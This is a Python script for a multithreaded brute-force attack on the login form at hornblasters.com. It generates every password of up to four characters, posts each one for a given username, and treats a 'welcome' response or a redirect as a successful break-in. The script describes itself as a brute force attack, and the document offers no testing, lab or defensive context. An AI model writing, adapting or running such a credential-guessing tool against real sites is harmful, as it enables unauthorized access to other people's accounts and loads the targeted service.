import requests
import itertools
import string
import threading
from queue import Queue
import time

# Configuration
login_url = 'https://hornblasters.com/login'
username = 'your_username'
characters = string.ascii_letters + string.digits + "!@#$%^&*()"
max_length = 4  # Set this to the maximum password length you want to test
num_threads = 10  # Number of threads to use

# Generate passwords
def generate_passwords(characters, length):
    return (''.join(candidate)
            for candidate in itertools.product(characters, repeat=length))

# Worker function for each thread
def worker(password_queue):
    while not password_queue.empty():
        password = password_queue.get()
        print(f"[INFO] Trying password: {password}")
        payload = {'username': username, 'password': password}
        try:
            response = requests.post(login_url, data=payload)
            # Check for successful login conditions
            if "welcome" in response.text.lower() or response.status_code == 302:
                print(f"[+] Successful login with password: {password}")
                password_queue.queue.clear()  # Clear remaining passwords
                break
            else:
                print(f"[-] Failed login with password: {password}")
        except requests.RequestException as e:
            print(f"[ERROR] Request failed: {e}")
        finally:
            password_queue.task_done()
        # Sleep for a short time to simulate some delay and reduce server load
        time.sleep(0.1)

# Create a queue of passwords
password_queue = Queue()

# Generate and enqueue passwords
for length in range(1, max_length + 1):
    for password in generate_passwords(characters, length):
        password_queue.put(password)

print(f"[INFO] Generated {password_queue.qsize()} passwords")

# Create and start threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=worker, args=(password_queue,))
    thread.start()
    threads.append(thread)
    print(f"[INFO] Started thread {i + 1}")

# Wait for all threads to complete
for thread in threads:
    thread.join()

print("[INFO] Brute force attack completed.")
